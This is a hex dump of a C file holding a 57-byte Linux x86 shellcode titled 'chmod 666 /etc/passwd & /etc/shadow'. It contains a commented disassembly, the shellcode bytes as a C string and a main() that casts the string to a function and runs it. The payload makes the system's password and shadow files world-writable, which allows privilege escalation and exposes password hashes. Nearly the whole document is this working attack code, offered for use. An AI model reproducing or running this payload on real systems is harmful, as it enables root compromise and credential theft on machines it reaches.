00000000  2f 2a 0d 0a 54 69 74 6c  65 3a 09 4c 69 6e 75 78  |/*..Title:.Linux|
00000010  20 78 38 36 20 63 68 6d  6f 64 20 36 36 36 20 2f  | x86 chmod 666 /|
00000020  65 74 63 2f 70 61 73 73  77 64 20 26 20 2f 65 74  |etc/passwd & /et|
00000030  63 2f 73 68 61 64 6f 77  20 2d 20 35 37 20 62 79  |c/shadow - 57 by|
00000040  74 65 73 0d 0a 41 75 74  68 6f 72 3a 09 4a 65 61  |tes..Author:.Jea|
00000050  6e 20 50 61 73 63 61 6c  20 50 65 72 65 69 72 61  |n Pascal Pereira|
00000060  20 3c 70 65 72 65 69 72  61 40 73 65 63 62 69 7a  | <pereira@secbiz|
00000070  2e 64 65 3e 0d 0a 57 65  62 3a 09 68 74 74 70 3a  |.de>..Web:.http:|
00000080  2f 2f 30 78 66 66 65 34  2e 6f 72 67 0d 0a 0d 0a  |//0xffe4.org....|
00000090  0d 0a 44 69 73 61 73 73  65 6d 62 6c 79 20 6f 66  |..Disassembly of|
000000a0  20 73 65 63 74 69 6f 6e  20 2e 74 65 78 74 3a 0d  | section .text:.|
000000b0  0a 0d 0a 30 38 30 34 38  30 36 30 20 3c 5f 73 74  |...08048060 <_st|
000000c0  61 72 74 3e 3a 0d 0a 20  38 30 34 38 30 36 30 3a  |art>:.. 8048060:|
000000d0  20 20 20 20 20 20 20 33  31 20 63 30 20 20 20 20  |       31 c0    |
000000e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 78  |               x|
000000f0  6f 72 20 20 20 20 25 65  61 78 2c 25 65 61 78 0d  |or    %eax,%eax.|
00000100  0a 20 38 30 34 38 30 36  32 3a 20 20 20 20 20 20  |. 8048062:      |
00000110  20 36 36 20 62 39 20 62  36 20 30 31 20 20 20 20  | 66 b9 b6 01    |
00000120  20 20 20 20 20 20 20 20  20 6d 6f 76 20 20 20 20  |         mov    |
00000130  24 30 78 31 62 36 2c 25  63 78 0d 0a 20 38 30 34  |$0x1b6,%cx.. 804|
00000140  38 30 36 36 3a 20 20 20  20 20 20 20 35 30 20 20  |8066:       50  |
00000150  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000160  20 20 20 20 70 75 73 68  20 20 20 25 65 61 78 0d  |    push   %eax.|
00000170  0a 20 38 30 34 38 30 36  37 3a 20 20 20 20 20 20  |. 8048067:      |
00000180  20 36 38 20 37 33 20 37  33 20 37 37 20 36 34 20  | 68 73 73 77 64 |
00000190  20 20 20 20 20 20 20 20  20 70 75 73 68 20 20 20  |         push   |
000001a0  24 30 78 36 34 37 37 37  33 37 33 0d 0a 20 38 30  |$0x64777373.. 80|
000001b0  34 38 30 36 63 3a 20 20  20 20 20 20 20 36 38 20  |4806c:       68 |
000001c0  32 66 20 32 66 20 37 30  20 36 31 20 20 20 20 20  |2f 2f 70 61     |
000001d0  20 20 20 20 20 70 75 73  68 20 20 20 24 30 78 36  |     push   $0x6|
000001e0  31 37 30 32 66 32 66 0d  0a 20 38 30 34 38 30 37  |1702f2f.. 804807|
000001f0  31 3a 20 20 20 20 20 20  20 36 38 20 32 66 20 36  |1:       68 2f 6|
00000200  35 20 37 34 20 36 33 20  20 20 20 20 20 20 20 20  |5 74 63         |
00000210  20 70 75 73 68 20 20 20  24 30 78 36 33 37 34 36  | push   $0x63746|
00000220  35 32 66 0d 0a 20 38 30  34 38 30 37 36 3a 20 20  |52f.. 8048076:  |
00000230  20 20 20 20 20 38 39 20  65 33 20 20 20 20 20 20  |     89 e3      |
00000240  20 20 20 20 20 20 20 20  20 20 20 20 20 6d 6f 76  |             mov|
00000250  20 20 20 20 25 65 73 70  2c 25 65 62 78 0d 0a 20  |    %esp,%ebx.. |
00000260  38 30 34 38 30 37 38 3a  20 20 20 20 20 20 20 62  |8048078:       b|
00000270  30 20 30 66 20 20 20 20  20 20 20 20 20 20 20 20  |0 0f            |
00000280  20 20 20 20 20 20 20 6d  6f 76 20 20 20 20 24 30  |       mov    $0|
00000290  78 66 2c 25 61 6c 0d 0a  20 38 30 34 38 30 37 61  |xf,%al.. 804807a|
000002a0  3a 20 20 20 20 20 20 20  63 64 20 38 30 20 20 20  |:       cd 80   |
000002b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002c0  69 6e 74 20 20 20 20 24  30 78 38 30 0d 0a 20 38  |int    $0x80.. 8|
000002d0  30 34 38 30 37 63 3a 20  20 20 20 20 20 20 33 31  |04807c:       31|
000002e0  20 63 30 20 20 20 20 20  20 20 20 20 20 20 20 20  | c0             |
000002f0  20 20 20 20 20 20 78 6f  72 20 20 20 20 25 65 61  |      xor    %ea|
00000300  78 2c 25 65 61 78 0d 0a  20 38 30 34 38 30 37 65  |x,%eax.. 804807e|
00000310  3a 20 20 20 20 20 20 20  35 30 20 20 20 20 20 20  |:       50      |
00000320  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000330  70 75 73 68 20 20 20 25  65 61 78 0d 0a 20 38 30  |push   %eax.. 80|
00000340  34 38 30 37 66 3a 20 20  20 20 20 20 20 36 38 20  |4807f:       68 |
00000350  36 31 20 36 34 20 36 66  20 37 37 20 20 20 20 20  |61 64 6f 77     |
00000360  20 20 20 20 20 70 75 73  68 20 20 20 24 30 78 37  |     push   $0x7|
00000370  37 36 66 36 34 36 31 0d  0a 20 38 30 34 38 30 38  |76f6461.. 804808|
00000380  34 3a 20 20 20 20 20 20  20 36 38 20 32 66 20 32  |4:       68 2f 2|
00000390  66 20 37 33 20 36 38 20  20 20 20 20 20 20 20 20  |f 73 68         |
000003a0  20 70 75 73 68 20 20 20  24 30 78 36 38 37 33 32  | push   $0x68732|
000003b0  66 32 66 0d 0a 20 38 30  34 38 30 38 39 3a 20 20  |f2f.. 8048089:  |
000003c0  20 20 20 20 20 36 38 20  32 66 20 36 35 20 37 34  |     68 2f 65 74|
000003d0  20 36 33 20 20 20 20 20  20 20 20 20 20 70 75 73  | 63          pus|
000003e0  68 20 20 20 24 30 78 36  33 37 34 36 35 32 66 0d  |h   $0x6374652f.|
000003f0  0a 20 38 30 34 38 30 38  65 3a 20 20 20 20 20 20  |. 804808e:      |
00000400  20 38 39 20 65 33 20 20  20 20 20 20 20 20 20 20  | 89 e3          |
00000410  20 20 20 20 20 20 20 20  20 6d 6f 76 20 20 20 20  |         mov    |
00000420  25 65 73 70 2c 25 65 62  78 0d 0a 20 38 30 34 38  |%esp,%ebx.. 8048|
00000430  30 39 30 3a 20 20 20 20  20 20 20 62 30 20 30 66  |090:       b0 0f|
00000440  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000450  20 20 20 6d 6f 76 20 20  20 20 24 30 78 66 2c 25  |   mov    $0xf,%|
00000460  61 6c 0d 0a 20 38 30 34  38 30 39 32 3a 20 20 20  |al.. 8048092:   |
00000470  20 20 20 20 63 64 20 38  30 20 20 20 20 20 20 20  |    cd 80       |
00000480  20 20 20 20 20 20 20 20  20 20 20 20 69 6e 74 20  |            int |
00000490  20 20 20 24 30 78 38 30  0d 0a 20 38 30 34 38 30  |   $0x80.. 80480|
000004a0  39 34 3a 20 20 20 20 20  20 20 33 31 20 63 30 20  |94:       31 c0 |
000004b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004c0  20 20 78 6f 72 20 20 20  20 25 65 61 78 2c 25 65  |  xor    %eax,%e|
000004d0  61 78 0d 0a 20 38 30 34  38 30 39 36 3a 20 20 20  |ax.. 8048096:   |
000004e0  20 20 20 20 34 30 20 20  20 20 20 20 20 20 20 20  |    40          |
000004f0  20 20 20 20 20 20 20 20  20 20 20 20 69 6e 63 20  |            inc |
00000500  20 20 20 25 65 61 78 0d  0a 20 38 30 34 38 30 39  |   %eax.. 804809|
00000510  37 3a 20 20 20 20 20 20  20 63 64 20 38 30 20 20  |7:       cd 80  |
00000520  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000530  20 69 6e 74 20 20 20 20  24 30 78 38 30 0d 0a 0d  | int    $0x80...|
00000540  0a 0d 0a 0d 0a 2a 2f 0d  0a 0d 0a 23 69 6e 63 6c  |.....*/....#incl|
00000550  75 64 65 20 3c 73 74 64  69 6f 2e 68 3e 0d 0a 0d  |ude <stdio.h>...|
00000560  0a 63 68 61 72 20 73 68  65 6c 6c 63 6f 64 65 5b  |.char shellcode[|
00000570  5d 20 3d 20 22 5c 78 33  31 5c 78 63 30 5c 78 36  |] = "\x31\xc0\x6|
00000580  36 5c 78 62 39 5c 78 62  36 5c 78 30 31 5c 78 35  |6\xb9\xb6\x01\x5|
00000590  30 5c 78 36 38 5c 78 37  33 5c 78 37 33 5c 78 37  |0\x68\x73\x73\x7|
000005a0  37 5c 78 36 34 22 0d 0a  20 20 20 20 20 20 20 20  |7\x64"..        |
000005b0  20 20 20 20 20 20 20 20  20 20 20 22 5c 78 36 38  |           "\x68|
000005c0  5c 78 32 66 5c 78 32 66  5c 78 37 30 5c 78 36 31  |\x2f\x2f\x70\x61|
000005d0  5c 78 36 38 5c 78 32 66  5c 78 36 35 5c 78 37 34  |\x68\x2f\x65\x74|
000005e0  5c 78 36 33 5c 78 38 39  5c 78 65 33 22 0d 0a 20  |\x63\x89\xe3".. |
000005f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000600  20 20 22 5c 78 62 30 5c  78 30 66 5c 78 63 64 5c  |  "\xb0\x0f\xcd\|
00000610  78 38 30 5c 78 33 31 5c  78 63 30 5c 78 35 30 5c  |x80\x31\xc0\x50\|
00000620  78 36 38 5c 78 36 31 5c  78 36 34 5c 78 36 66 5c  |x68\x61\x64\x6f\|
00000630  78 37 37 22 0d 0a 20 20  20 20 20 20 20 20 20 20  |x77"..          |
00000640  20 20 20 20 20 20 20 20  20 22 5c 78 36 38 5c 78  |         "\x68\x|
00000650  32 66 5c 78 32 66 5c 78  37 33 5c 78 36 38 5c 78  |2f\x2f\x73\x68\x|
00000660  36 38 5c 78 32 66 5c 78  36 35 5c 78 37 34 5c 78  |68\x2f\x65\x74\x|
00000670  36 33 5c 78 38 39 5c 78  65 33 22 0d 0a 20 20 20  |63\x89\xe3"..   |
00000680  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000690  22 5c 78 62 30 5c 78 30  66 5c 78 63 64 5c 78 38  |"\xb0\x0f\xcd\x8|
000006a0  30 5c 78 33 31 5c 78 63  30 5c 78 34 30 5c 78 63  |0\x31\xc0\x40\xc|
000006b0  64 5c 78 38 30 22 3b 0d  0a 0d 0a 0d 0a 69 6e 74  |d\x80";......int|
000006c0  20 6d 61 69 6e 28 29 0d  0a 7b 0d 0a 20 20 66 70  | main()..{..  fp|
000006d0  72 69 6e 74 66 28 73 74  64 6f 75 74 2c 22 4c 65  |rintf(stdout,"Le|
000006e0  6e 67 68 74 3a 20 25 64  5c 6e 22 2c 73 74 72 6c  |nght: %d\n",strl|
000006f0  65 6e 28 73 68 65 6c 6c  63 6f 64 65 29 29 3b 0d  |en(shellcode));.|
00000700  0a 20 20 28 2a 28 76 6f  69 64 20 20 28 2a 29 28  |.  (*(void  (*)(|
00000710  29 29 20 73 68 65 6c 6c  63 6f 64 65 29 28 29 3b  |)) shellcode)();|
00000720  0d 0a 7d                                          |..}|
00000723
